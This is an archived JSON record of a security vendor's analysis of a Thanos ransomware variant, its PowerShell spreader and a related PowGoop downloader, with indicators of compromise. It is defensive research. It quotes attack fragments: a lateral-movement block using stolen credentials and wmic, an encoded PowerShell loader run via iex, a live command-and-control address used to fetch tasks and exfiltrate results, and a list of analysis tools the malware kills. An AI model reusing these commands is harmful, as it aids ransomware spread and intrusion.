{
    "id": "a1f39981-404e-42bf-a673-547ad560966c",
    "created_at": "2023-01-12T14:59:37.98866Z",
    "updated_at": "2025-03-27T02:09:29.531916Z",
    "deleted_at": null,
    "sha1_hash": "8d6725ce70246e44765e3dd27dd1edef6c984c12",
    "title": "2020-09-04 - Thanos Ransomware- Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa",
    "authors": "",
    "file_creation_date": "2022-05-28T00:36:09Z",
    "file_modification_date": "2022-05-28T00:36:09Z",
    "file_size": 433313,
    "plain_text": "# Thanos Ransomware: Destructive Variant Targeting State- Run Organizations in the Middle East and North Africa\n\n**unit42.paloaltonetworks.com/thanos-ransomware/**\n\nRobert Falcone September 4, 2020\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nSeptember 4, 2020 at 6:00 AM\n\n[Category: Ransomware,](https://unit42.paloaltonetworks.com/category/ransomware/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Middle East,](https://unit42.paloaltonetworks.com/tag/middle-east/) [Thanos](https://unit42.paloaltonetworks.com/tag/thanos/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/thanos-ransomware/)\n\n## Executive Summary\n\nOn July 6 and July 9, 2020, we observed files associated with an attack on two state-run\norganizations in the Middle East and North Africa that ultimately installed and ran a variant of the\nThanos ransomware. The Thanos variant created a text file that displayed a ransom message\nrequesting the victim transfer “20,000$” into a specified Bitcoin wallet to restore the files on the\nsystem. We do not have visibility into the overall impacts of these attacks or whether or not the\nthreat actors were successful in receiving a payment from the victims.\n\n\n-----\n\n_Figure 1. Thanos’ ransom note displayed after encrypting files._\n\nThe ransomware was also configured to overwrite the master boot record (MBR), which is an\nimportant component loaded on a system’s hard drive that is required for the computer to locate\nand load the operating system. The ransomware overwrites the MBR to display the same ransom\nmessage as the previously mentioned text file, which is a technique we do not see often. The most\n[notable example we’ve observed involved the Petya ransomware in 2017. Overwriting the MBR is a](https://unit42.paloaltonetworks.com/unit42-threat-brief-petya-ransomware/)\nmore destructive approach to ransomware than usual. Victims would have to expend more effort to\nrecover their files – even if they paid the ransom. Fortunately, in this case, the code responsible for\noverwriting the MBR caused an exception because the ransom message contained invalid\ncharacters, which left the MBR intact and allowed the system to boot correctly. This means that\neven though the ransomware was configured to overwrite the MBR, the threat actors were\nunsuccessful in causing the computers they infected with the Thanos ransomware not to boot.\n\n\n-----\n\n_Figure 2. Thanos’ ransom note displayed if MBR overwrite was successful._\n\n[The Thanos ransomware was first discussed by Recorded Future in February 2020 when it was](https://www.recordedfuture.com/thanos-ransomware-builder/)\nadvertised for sale on underground forums. The Thanos ransomware has a builder that allows\nactors to customize the sample with a variety of available settings. The fact Thanos is for sale\nsuggests the likelihood of multiple threat actors using this ransomware. However, we believe with\nhigh confidence that the same actor used a Thanos variant in attacks on two state-run\norganizations in the Middle East and North Africa.\n\nBased on our telemetry, we first observed Thanos on Jan. 13, 2020, and have seen over 130\nunique samples since. We believe the threat actors had prior access to these organizations’\nnetworks, as the samples contained credentials that we believe the actors had stolen from systems\non these organizations’ networks prior to the delivery of the ransomware.\n\nThis particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in\norder to load Thanos into memory and to run it on the local system. These layers were largely\n[based on code freely available in open source frameworks, such as Sharp-Suite and](https://github.com/FuzzySecurity/Sharp-Suite) [Donut. One of](https://github.com/TheWover/donut)\nthe layers involved a custom PowerShell that was responsible for spreading Thanos to other\nsystems on the local network using previously mentioned stolen credentials.\n\nWe analyzed this specific Thanos sample that the actors built for the Middle Eastern and Northern\nAfrican state-run organizations. We determined that the ransomware was loaded into and run from\nwithin memory at these organizations. We found the Thanos variant is functionally very similar to\n[the variant discussed by Fortinet in July 2020. The sample analyzed by Fortinet also contained](https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode)\nnetwork-spreading functionality enabled, which included network credentials from another state-run\norganization in the same municipality as the Middle Eastern state-run organization we observed.\n\n\n-----\n\nThe sample analyzed by Fortinet included the same Bitcoin wallet and contact email that we\nobserved. When combined with the targeting of an organization in the same municipality in a similar\ntime frame, this suggests a common actor behind these attacks.\n\n[Palo Alto Networks customers are protected from the attacks discussed in this blog by WildFire,](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n[which correctly identifies all related samples as malicious, and Cortex XDR, which blocks the](https://www.paloaltonetworks.com/cortex/cortex-xdr)\ncomponents involved in this ransomware infection.\n\n## Overview of Thanos Variant Activity\n\nWe do not know how the actors delivered the Thanos ransomware to the two state-run\norganizations in the Middle East and North Africa. However, we know the threat group behind the\nuse of these tools had previous access to these networks as they had already obtained valid\ncredentials from the networks. The exact same Thanos sample was used at both of these\norganizations, which suggests that the same actor created the sample using the Thanos builder.\n\nThe Thanos sample created for these networks executes several layers before the .NET Thanos\nransomware runs on a system, specifically using code from several open source frameworks. The\nlayers start at the top with a PowerShell script that not only loads another PowerShell script as a\nsub-layer, but also attempts to spread the ransomware to other systems on the network using\npreviously stolen credentials. The PowerShell in the second layer does nothing more than load\nembedded C# code inline so the initial PowerShell script can execute it. The C# code is the third\nlayer, and it is based on [UrbanBishop, which is publicly available as part of the Sharp-Suite](https://github.com/FuzzySecurity/Sharp-Suite/blob/master/UrbanBishop/BerlinDefence.cs)\nframework on GitHub. The UrbanBishop code is responsible for writing shellcode to a remote\nprocess and executing it, of which the shellcode is the final layer before running the Thanos\nransomware. The shellcode in this case was created by Donut, which is another open source\nframework that will generate shellcode that can load and execute .NET assemblies in memory.\n\n_Figure 3. Layers executed to run the Thanos ransomware on the system._\n\n\n-----\n\n## PowerShell Spreader\n\nThe PowerShell spreader, which we call LogicalDuckBill, has two primary purposes:\n\n1. Loading and running the Thanos ransomware.\n2. Spreading to other systems by copying itself to and executing itself on remote systems.\n\nThe loader functionality within LogicalDuckBill starts with a base64 encoded PowerShell script that\nit will decode and run using the IEX command. The PowerShell decoded and executed contains the\nfollowing code, which effectively loads C# code based on UrbanBishop that LogicalDuckBill will call\nlater to inject shellcode:\n\n$code = @\"\n\n[C# code based on UrbanBishop]\n\n\"@\n\nAdd-Type -TypeDefinition $code -Language CSharp\n\nLogicalDuckBill will then check to see if a file named “logdb.txt” or “logdb.txt.locked” exists in the\n“c:\\” drive before running, which is the method the spreader uses to be sure to only run one\ninstance of the embedded ransomware on each system. We also observed another related sample\nthat looked for “logdbnnn.txt” instead, which is why we call this script LogicalDuckBill. If these files\nare not present, LogicalDuckBill will write “1” to this text file and then continue to carry out its\nfunctionality.\n\nLogicalDuckBill then creates a “notepad.exe” process, which it will then iterate through running\nprocesses to find the process ID (PID) of the created “notepad.exe” process. With the PID of the\nnotepad process, the PowerShell script calls the “Do” method in the loaded C# code based on\nUrbanBishop, which ultimately injects shellcode generated by the Donut framework into the notepad\nprocess and executes it. The shellcode then decrypts and loads an embedded .NET executable into\nmemory and executes it, which is the Thanos ransomware payload.\n\nThe spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection\ncmdlet to get the remote addresses of the current TCP connections on the system. The code then\nlooks through these remote addresses for those that start with 10., 172. and 192. as the first octet\nand will iterate through each discovered network by changing the last octet from 1 to 254 in a loop.\nFor each iteration, the script will use the Test-NetConnection cmdlet to see if the script can connect\nto each remote system over SMB port tcp/445, and if it can, it uses the net use command to\nconnect to the remote system with previously stolen credentials and mounts the remote system’s C:\ndrive to the local system’s X: drive. The script then uses the copy command to copy itself to the\nnewly mapped X: drive, which effectively copies LogicalDuckBill to the remote system. The script\nwill then use wmic to run process call create on the remote system to run the newly copied\nLogicalDuckBill sample on the remote system. The spreading functionality finished each iteration by\ndeleting the mapped drive, all of which is carried out by the following code:\n\nif((Test-NetConnection $tr -Port 445).TcpTestSucceeded){\n\n\n-----\n\nnet use x: \\\\[IP address]\\c$ /user:[Victim Domain]\\[Username] [Password]\n\ncopy c:\\windows\\update4.ps1 x:\\windows\\update4.ps1\n\nwmic /node:[IP address] /user:[Victim Domain]\\[Username] /password:[Password] process call\ncreate \"powershell -exec bypass -file c:\\windows\\update4.ps1\"\n\nnet use x: /del /y\n\n}\n\nThis spreading method in LogicalDuckBill is similar to one found within Thanos’ C# code. However,\nusing the PowerShell script to spread allowed the actors to include previously stolen network\ncredentials when creating the mapped drive and when running the copied PowerShell script using\nwmic.\n\n## Thanos Ransomware\n\n[The Thanos ransomware was first observed by Recorded Future in February 2020 when it was](https://www.recordedfuture.com/thanos-ransomware-builder/)\nadvertised for sale on underground forums. The Thanos ransomware has code overlaps with other\n[ransomware variants, such as Hakbit, and has a builder that allows the user to customize the](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Hakbit)\nsample with a variety of available settings. This ransomware appears to be still under active\ndevelopment, as we observed newly added functionality in the samples built to run on the Middle\nEastern and Northern African state-run organizations compared to the original samples analyzed by\nRecorded Future. In fact, the Thanos ransomware built to run on these two organizations’ networks\n[was closer in available functionality to the variant discussed by Fortinet in July 2020. The most](https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode)\nobvious difference is that the disabling of safe boot discussed by Fortinet is not available in these\nsamples.\n\nLike other Thanos ransomware samples, the variant built to run on these two organizations’\nnetworks uses a 2048-bit RSA public key to encrypt files whose file extensions match those listed in\nTable 1. After encrypting the file’s contents, Thanos will add the file extension “.locked” to the file on\ndisk.\n\ndat ppt mdb odg backup aiff\n\ntxt doc dbf raw pdf flac\n\njpeg docx odb nef cert m4a\n\ngif sxi myd svg docm csv\n\njpg sxw php psd xlsm sql\n\npng odt java vmx dwg ora\n\nphp hwp cpp vmdk bak mdf\n\ncs tar pas vdi qbw ldf\n\n\n-----\n\ncpp bz2 asm lay6 nd ndf\n\nrar mkv key sqlite3 tlg dtsx\n\nzip eml pfx sqlitedb lgb rdl\n\nhtml msg pem accdb pptx dim\n\nhtm ost p12 java mov mrimg\n\nxlsx pst csr class xdw qbb\n\nxls edb gpg mpeg ods rtf\n\navi sql aes djvu wav 7z\n\nmp4 accdb vsd tiff mp3\n\n_Table 1. List of extensions of files that Thanos will encrypt._\n\nThis variant of Thanos writes a ransom note to a file named “HOW_TO_DECYPHER_FILES.txt” to\nthe desktop and all of the folders that contained files that Thanos encrypted. The ransom note, as\nseen in Figure 2, requests “20,000$” worth of Bitcoin be transferred to a wallet\n“1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9” and a contact email of “josephnull@secmail.pro” to\nrecover the encrypted files. The contact email and Bitcoin wallet ID were seen by other researchers\n[and organizations in July 2020, as seen in the .HTA ransom note displayed in Fortinet’s blog and](https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode)\nseveral [tweets.](https://twitter.com/JAMESWT_MHT/status/1281515013132496896)\n\nThe features and functionality within the Thanos ransomware have been analyzed by other\norganizations. Instead of rehashing this analysis, we will only discuss the functionality that was\nenabled within this variant of Thanos that had not been discussed previously. However, we\ndelineate which previously discussed functionalities are disabled and enabled in this variant of\nThanos in Tables 2 and 3 respectively.\n\n\n-----\n\nMax. File Size Protect Process Disable FAC\n\nPersistence - Melt Wallpaper Static Pass\n\nDeceiving Msg Immortal Process RIPlace\n\nUnlock Files FTP Logger Data Stealer\n\nAnti-VM Wake-on-LAN Max. Steal Size\n\nDelay Delayed Activation Alternate Algo\n\nAMSI Bypass Client Expiration Drag and Drop\n\n_Table 2. Disabled functionality, which are likely unchecked boxes on the Thanos ransomware_\n_builder user interface (UI)._\n\nKill Defender Fast Mode Enhanced Notifications\n\nLAN AntiKill Customize Notifications\n\n_Table 3. Enabled functionality, which are likely checked boxes on the Thanos ransomware builder_\n_UI._\n\nThe first configuration option enabled that doesn't match the analysis of previous variants of Thanos\nstarts with the code trying to disable User Account Control (UAC) by setting the keys\n\"LocalAccountTokenFilterPolicy\" and \"EnableLinkedConnections\" in\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System to 1. It then attempts to enumerate\nlocal and mapped storage volumes. To enumerate the local volumes, the code creates and runs a\nbatch script that is almost exactly the same as the batch script used by Ragnar Locker ransomware\nto enumerate the local storage volumes. Ragnar Locker used this script to create a VirtualBox\nconfiguration file that sets these volumes as SharedFolders, which allows Ragnar Locker to access\n[the local storage volumes while it runs within a VirtualBox virtual machine, as discussed by Sophos.](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)\nThe Thanos implementation does not write the results to a VirtualBox configuration file. Instead, it\njust prints the configuration to the screen, but does not save the output. Therefore, we cannot be\ncertain of the purpose of this functionality.\n\nThe second functionality enabled in this sample that had not been observed in previous Thanos\nvariants involved the ability to overwrite the master boot record (MBR). Once the code checks to\nsee if the operating system version is not \"Windows 10\" or \"Windows 8,\" the code will attempt to\nopen \"\\\\.\\PhysicalDrive0\" and write a 512-byte string to offset 0. The byte array that is written to\noffset 0 of \"\\\\.\\PhysicalDrive0\" initially has a ransom message of \"Your files are encrypted. Contact\nus at: get-my-data@protonmail.com...\", but the code will replace this string with the following string\nbefore writing to disk:\n\nDon\\xe2\\x80\\x99t worry, you can return all your files!\\r\\n\\r\\nThe Price to get all things to the normal :\n20,000$\\r\\nMy BTC Wallet ID :\\r\\n1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\\r\\n\\r\\nContact:\njosephnull@secmail.pro\\r\\n\n\n\n-----\n\nThe interesting part of the overwriting of the MBR in this specific sample is that it does not work\ncorrectly, which can be blamed on either a programming error or the custom message included by\nthe actor. As you can see above, the custom message has the bytes \"\\xe2\\x80\\x99\" for the\napostrophe character in unicode, but the code attempts to convert each character using the\n\"Convert.ToByte\" function to replace a single byte in the initial ransom string. However, the unicode\napostrophe character is three bytes long and causes an exception that breaks the MBR overwriting\nfunctionality. We confirmed that after changing this single character, the MBR overwriting\nfunctionality works, which results in the following being displayed instead of Windows booting\ncorrectly:\n\nThe third previously unmentioned functionality in this Thanos sample involves creating a thread that\nwatches for newly connected storage volumes. The code uses a management event watcher that\ncalls a function when a new storage volume is connected using the following WMI query:\n\nSELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\n\nWhen the event watcher detects a new storage volume connected, it creates a thread that carries\nout the file encrypting functionality used by Thanos to encrypt files on the original storage volumes.\n\nThe last functionality added to this version of Thanos is the ability to detect and kill more analysis\ntools to evade detection and analysis. The sample will enumerate through running processes and\nkill those whose names match the following:\n\nhttp analyzer stand-alone intercepter procexp64\n\nfiddler Intercepter-NG RDG Packer Detector\n\neffetech http sniffer ollydbg CFF Explorer\n\n\n-----\n\nfiresheep x64dbg PEiD\n\nIEWatch Professional x32dbg protection_id\n\ndumpcap dnspy LordPE\n\nwireshark dnspy-x86 pe-sieve\n\nwireshark portable de4dot MegaDumper\n\nsysinternals tcpview ilspy UnConfuserEx\n\nNetworkMiner dotpeek Universal_Fixer\n\nNetworkTrafficView dotpeek64 NoFuserEx\n\nHTTPNetworkSniffer ida64\n\ntcpdump procexp\n\n_Table 4. List of tools this Thanos variant will detect and kill to evade detection_\n\n## Possibly Related Downloader: Introducing PowGoop\n\nWhile we cannot confirm the connection, we believe the actors deploying the Thanos ransomware\nat the Middle Eastern state-run organization also used a downloader that we call PowGoop. The\nactors would use the PowGoop downloader to reach out to a remote server to download and\nexecute additional PowerShell scripts. The files existed in the same environment as the\nLogicalDuckBill sample previously discussed, but we did not observe the actors specifically running\nboth PowGoop and the LogicalDuckBill spreader. Also, as expected, there is very little code overlap\nbetween the PowerShell code in this downloader and LogicalDuckBill, as their functionality differs\ndramatically. The only code overlap is a common variable name $a that both of the scripts use to\nstore the base64 encoded data prior to decoding, which is not a strong enough connection to\nsuggest a common author.\n\nThe PowGoop downloader has two components: a DLL loader and a PowerShell-based\ndownloader. The PowGoop loader component is responsible for decrypting and running the\nPowerShell code that comprises the PowGoop downloader. The PowGoop loader DLL that existed\nin the same environment as LogicalDuckBill had a filename of goopdate.dll that was likely\nsideloaded by the legitimate and signed Google Update executable. The sideloading process would\nstart with the legitimate GoogleUpdate.exe file loading a legitimate DLL with a name of\ngoopdate86.dll. The sideloading would occur when the goopdate86.dll library loads the goopdate.dll\nfile, which effectively runs the PowGoop loader. We observed the following files that are likely\nassociated:\n\n**SHA256** **Filename**\n\nb60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 GoogleUpdate.exe\n\ndea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e goopdate86.dll\n\n\n-----\n\na224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 goopdate.dll\n\nb7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e config.dat\n\n_Table 5. List of files associated with the sideloading of the PowGoop downloader_\n\nThe goopdate.dll file is the PowGoop loader, whose functionality exists within an exported function\nnamed DllRegisterServer. The goopdate.dll file’s DllEntryPoint function, which would be called if\nloaded via the sideloading process mentioned above, does nothing more than attempt to run the\nDllRegisterServer exported function using the following command:\n\nrundll32.exe <module filename>,DllRegisterServer\n\nThe functional code in DllRegisterServer reads a file named config.dat, decodes it and runs it as a\nPowerShell script, which is the PowGoop downloader component. To decode the config.dat file, the\nDLL builds and executes a PowerShell script using the CreateProcessA function. The PowerShell\nscript built by the PowGoop loader will read the contents of the config.dat file, base64 decode and\ndecrypt the contents using a simple subtract by two cipher and run the result PowGoop downloader\nscript using the IEX command, as seen in the following:\n\npowershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return\n\n[System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in =\n\n[System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i]\n\n- 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp\n= bDec2 $dec;return $temp;}$a=get-content C:\\\\Users\\\\[username]\\\\Desktop\n\nconfig.dat;$t =bDd $a;iex($t);\n\nThe config.dat file we decrypted is the PowGoop downloader that the actors configured to use the\nfollowing URL as its command and control (C2):\n\nhttp://107.174.241[.]175:80/index.php\n\nThe PowGoop downloader will communicate with the C2 server via HTTP GET requests to this\nURL. It will expect the C2 server to respond to requests with base64 encoded data that the script\nwill decode, decompress the decoded data using System.IO.Compression.GzipStream and then\ndecrypt the decompressed data using the same subtract by two cipher used to decrypt the\nconfig.dat file. It will first communicate with the C2 to obtain a unique identifier value that the C2 will\nassign to the compromised system. After obtaining this identifier, the script will continue to\ncommunicate with the C2 to obtain Tasks, which the script will decode, decompress, decrypt and\nrun as PowerShell scripts. The script exfiltrates the result of a task to the C2 by encrypting the\nresult using an add by two cipher, compressing the ciphertext and base64 encoding it, and\ntransmitting it to the C2 server using a GET request with the data in the Cookie field of the HTTP\nrequest, specifically as the R value.\n\n## Conclusion\n\n\n-----\n\nActors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional\nsystems, specifically on networks of two state-run organizations in the Middle East and North Africa.\nThe Thanos variant created a text file that displayed a ransom message requesting the victim\ntransfer “20,000$” into a specified Bitcoin wallet to restore the files on the system.\n\nWhile the Thanos ransomware is not new, it appears that it is still under active development as the\nvariant used in these attacks contained new functionality. The new functionality included the ability\nto detect and evade more analysis tools, the enumeration of local storage volumes via a technique\nused by the Ragnar Locker ransomware and a new capability to monitor for newly attached storage\ndevices.\n\nMost importantly, this variant of Thanos also included the new ability to overwrite the MBR and\ndisplay the same ransom message. Overwriting the MBR is a much more destructive approach to\nransomware than previously used by Thanos and would require more effort for victims to recover\ntheir files even if they paid the ransom.\n\nPalo Alto Networks customers are protected from the attacks discussed in this blog in the following\nways:\n\nAll known Thanos ransomware and LogicalDuckBill samples have malicious verdicts in\n[WildFire.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\nAutoFocus customers can track this ransomware, PowerShell spreading script and the\n[potentially related downloader with the tags Thanos,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Thanos) [LogicalDuckBill and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.LogicalDuckBill) [PowGoop.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.PowGoop)\n[Cortex XDR blocks Thanos ransomware, LogicalDuckBill and PowGoop.](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n\n## Indicators of Compromise\n\n**LogicalDuckBill Samples**\n\n40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf\n\n06d5967a6b90b5b5f6a24b5f1e6bfc0fc5c82e7674817644d9c3de61008236dc\n\ncbb95952001cdc3492ae8fd56701ceff1d1589bcfafd74be86991dc59385b82d\n\n240e3bd7209dc5151b3ead0285e29706dff5363b527d16ebcc2548c0450db819\n\n**Thanos Samples**\n\n7aa46a296fbebdf3b13d399bf0dbe6e8a8fbcbc9ba696e5698326494b0da2e54\n\n58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f\n\nc460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850\n\nae66e009e16f0fad3b70ad20801f48f2edb904fa5341a89e126a26fd3fc80f75\n\n5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d\n\n**PowGoop Samples**\n\n\n-----\n\nb60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google\ninstaller, GoogleUpdate.exe)\n\ndea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e (legitimate Google\nDLL, goopdate86.dll)\n\na224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 (PowGoop Loader,\ngoopdate.dll)\n\nb7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e PowGoop\nDownloader, config.dat)\n\n**PowGoop Infrastructure**\n\n107.174.241[.]175\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-04 - Thanos Ransomware- Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa.pdf"
    ],
    "report_names": [
        "2020-09-04 - Thanos Ransomware- Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535577,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653698169,
    "ts_modification_date": 1653698169,
    "files": {
        "pdf": "https://archive.orkl.eu/8d6725ce70246e44765e3dd27dd1edef6c984c12.pdf",
        "text": "https://archive.orkl.eu/8d6725ce70246e44765e3dd27dd1edef6c984c12.txt",
        "img": "https://archive.orkl.eu/8d6725ce70246e44765e3dd27dd1edef6c984c12.jpg"
    }
}